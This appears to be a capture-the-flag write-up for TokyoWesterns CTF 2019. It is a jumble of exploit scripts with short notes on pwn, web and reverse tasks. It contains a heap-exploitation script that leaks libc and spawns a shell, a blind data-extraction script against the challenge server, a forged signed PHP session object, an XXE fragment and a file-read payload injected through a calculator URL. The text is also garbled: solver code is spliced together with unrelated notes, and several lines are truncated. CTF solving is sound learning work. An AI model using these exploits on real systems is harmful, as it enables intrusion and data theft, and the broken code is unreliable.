        dele(id0)
        id1 = add(0x30,'\n')
        id2 = add(0x30,'\n')
        dele(id1)
        id1 = add(0x30,'\n')
        dele(id1)
        id1 = add(0x30,'\n')
        dele(id1)
        id1 = add(0x30,'\n')
        dele(id1)
        id1 = add(0x30,'\n')
        dele(id1)
        id1 = add(0x30,'\n')
        dele(id1)
        id1 = add(0x30,'\n')
        dele(id1)
        id1 = add(0x30,'\n')
        dele(id2)
        dele(id1)
        print hex(id1)
        ch =1# int(raw_input("c"))
        if ch == 1:
            edit(id1,'\x3d\x21\x60')
        else:
            edit(id1,'\x3d\x21\x60\x00')
        id1 = add(0x30,'\n')
        print id1
        #id1 = 0x4982
        #raw_input("set 7")
        id2 = add(0x30,'\x00'*(0x2160-
0x214d)+p32(0)+p32(1)+p64(0x602060)+p64(0x0000deadc0bebeef))
        edit(1,p32(0x4007a0)+'\x00\x00')        
        dele(id1)       
        idc = add(0x30,'\n')    
        idm = add(0x30,'\n')
        dele(idc)
        dele(idm)
        print idm
        edit(idm,'\x48\x21\x60')        
        id1 = add(0x10,'\n')
        id3 = add(0x10, '\x18\x20\x60') 
        edit(id1,p32(0x400710)+'\x00\x00')
Web
j2x2j
easy xxe
PHP Note
If you've ever played WCTF(https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf),it will
be easy:) use Windows Defender  to read secret
        edit(id3,'\x20\x20\x60')
        dele(id1)
        addr = u64(p.recv(6).ljust(8,'\x00'))
        print hex(addr)
        libc_base = addr - (0x7f4df30a99c0-0x7f4df3029000)
        edit(id3,'\x78\x20\x60')
        edit(id1,p64(libc_base+324672)[:-2])
        p.recvuntil('>')
        p.sendline('/bin/sh')
        p.sendline('cat flag')
        #print id1
        #print idm
        #dele(id1)
        #dele(idm)
        #edit(idm,'\x40\x21\x60')
        #dele(1)
        #print p.recv(6)
        p.interactive()
    except:
        p.close()
        continue
]>
&xxe;
Output is bosycret|s:32:"2532bd172578d19923e5348420e02320";n
import requests
import string
import random
url = "http://phpnote.chal.ctf.westerns.tokyo/?action={}"
result = ""
def randstr(n=12):
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join([random.choice(chars) for _ in range(n)])
def loop(idx):
    l, h = 0, 0x100
    while h - l > 1:
        m = (h + l) // 2
        p = ''''''
        p = string.Template(p).substitute({'idx': idx, 'c': str(m)})
        sess_id = randstr()
        headers = {
        "Cookie": "PHPSESSID={}; path=/".format(sess_id)
        }
        requests.post("http://phpnote.chal.ctf.westerns.tokyo/?
action=login", headers=headers, data={'realname': p}, proxies=
{'http':'localhost:8082'})
        requests.post("http://phpnote.chal.ctf.westerns.tokyo/?
action=login", headers=headers, data={'realname': p, 'nickname': "
"}, proxies={'http':'localhost:8082'})
        re = requests.get("http://phpnote.chal.ctf.westerns.tokyo/?
action=index", headers=headers, proxies={'http':'localhost:8082'})
        if re.text.find('Welcome') != -1:
            h = m
        else:
            l = m
    return chr(l)
for i in range(0, 50):
    x = loop(i)
    print("[*]: " + x)
    result += x
print(result)
replace cookie['note'] ,u can getï¬‚ag:)
Oneline Calc
Payload:
Recover each byte by hand
Reverse
notes = array();
            $this->isadmin = $admin;
        }
        public function addnote($title, $body) {
            array_push($this->notes, [$title, $body]);
        }
        public function getnotes() {
            return $this->notes;
        }
        public function getflag() {
            if ($this->isadmin === true) {
                echo FLAG;
            }
        }
    }
    $note = new Note(true);
    $secret = "2532bd172578d19923e5348420e02320";
    var_dump(base64_encode(serialize($note)));
    $data = base64_encode(serialize($note));
    var_dump(hash_hmac('sha256', $data, $secret));
http://olc.chal.ctf.westerns.tokyo/calc.php?
formula=1;__asm__(%22jmp%20gIconEnd\ngIconData:\n.incbin%20\%22/srv/olc
/public/calc.php\%22\ngIconEnd:%22);extern%20char%20gIconData[];return%
20gIconData[0]
Reverse
Easy Crack Me
from z3 import *
def force():
    flag = [BitVec('x_%02d'%i,8) for i in range(32)]
    s = Solver()
    c = [128, 128, 255, 128, 255, 255, 255, 255, 128, 255, 255, 128, 128, 
255, 255, 128, 255, 255, 128, 255, 128, 128, 255, 255, 255, 255, 128, 255, 
255, 255, 128, 255]
    num_sum = 0
    cnt_6 = 0
    cnt_c = 0
    for i,v in enumerate(flag):
        if c[i] == 128:
            s.add(v >= 97)
            s.add(v = 48)
            s.add(v <= 57)
            s.add(v != 51)
            if cnt_6 == 12:
                s.add(v == 54)
            else:
                s.add(v != 54)
            cnt_6 += 1
            num_sum += v
    s.add(num_sum == 1048)
    s.add(flag[31] == 53)
    s.add(flag[1] == 102)
    s.add(flag[5] == 56) 
    s.add(flag[6] == 55) 
    s.add(flag[17] == 50) 
    s.add(flag[25] == 52)
    s.add(flag[11] == 98)
    sum_8x4 = [350, 218, 303, 305, 256, 305, 251, 258]
    xor_8x4 = [82, 12, 1, 15, 92, 5, 83, 88]
Meow
An image encrypting program compiled with Neko VM
Use nekoc -d meow.n  to get the bytecode
Stack-based VM
Too many unknown functions and variables
Read the bytecode of main routine
Read the pixels, checking width and height = 768
Complicated pixel transform algorithm, looks like xor and permutation
Heuristic test
Test with a black picture and a white picture, color looks inverted
Test with a gradient picture
    sum_4x8 = [297, 259, 299, 305, 309, 267, 255, 255]
    xor_4x8 = [1, 87, 7, 13, 13, 83, 81, 81]
    for i in range(8):
        sum_8x4_tmp = 0
        xor_8x4_tmp = 0
        sum_4x8_tmp = 0
        xor_4x8_tmp = 0
        for j in range(4):
            sum_8x4_tmp += flag[4*i+j]
            xor_8x4_tmp ^= flag[4*i+j]
            sum_4x8_tmp += flag[8*j+i]
            xor_4x8_tmp ^= flag[8*j+i]
        s.add(sum_8x4_tmp == sum_8x4[i])
        s.add(xor_8x4_tmp == xor_8x4[i])
        s.add(sum_4x8_tmp == sum_4x8[i])
        s.add(xor_4x8_tmp == xor_4x8[i])
    sum_2x16 = 0
    for i in range(16):
        sum_2x16 += flag[i*2]
    s.add(sum_2x16 == 1160)
    if s.check() == sat:
        m = s.model()
        r = ''.join([chr(m[v].as_long()) for v in flag])
        t = [v for v in r]
        t.sort()
        t = ''.join(t)
        if t == '00011224445567778889abbbcddeefff':
            print('TWCTF{'+r+'}')
force()
xor it with the encrypted black picture
get a picture of color lines, guessing column-based permutation
Recover the original picture
Make a black picture (0, 0, 0)
Encrypt it by the given program
Make a gredient picture
Xor it with the encrypted black picture
from PIL import Image
b = Image.new("RGB", (768, 768))
ptr = 0
for i in xrange(768):
    for j in xrange(768):
        b.putpixel((i, j), (i%256, i/256, i/256, 255))
b.save('aaa.png')
from PIL import Image
a = Image.open('tql.png')
c = Image.open('bbb.png')
buf = c.load()
buff = a.load()
b = Image.new("RGB", (768, 768))
Read the color sequence in a row to recover the permutation
ptr = 0
for i in xrange(768):
    for j in xrange(768):
        pix = [x for x in buf[i, j]]
        # print pix
        for k in xrange(3):
            pix[k] ^= buff[i, j][0] 
        b.putpixel((i, j), tuple(pix))
        ptr = (ptr + 1) % 25
b.save('flag.png')
from PIL import Image
a = Image.open('flag.png')
buf = a.load()
seq = []
for i in xrange(768):
    for j in xrange(1):
        pix = [x for x in buf[i, j]]
        seq.append(pix[1] * 256 + pix[0])